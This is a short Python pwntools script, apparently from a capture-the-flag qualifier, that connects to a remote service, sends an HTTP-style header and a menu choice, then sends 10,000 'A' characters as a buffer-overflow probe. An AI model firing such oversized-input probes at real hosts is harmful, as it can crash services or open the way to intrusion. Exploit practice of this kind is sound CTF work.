from pwn import *

s = remote("plus.or.kr", 9345)
#s = remote("awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me", 80)
head = "GET /trains HTTP/1.1\nContent-Type: text/html\n\n\n"

s.send(head+"\n\n")
print s.recv(1024)

s.send("7\n")
print s.recv(1024)

s.send("A"*10000+"\n")
print s.recv(1024)

s.close()
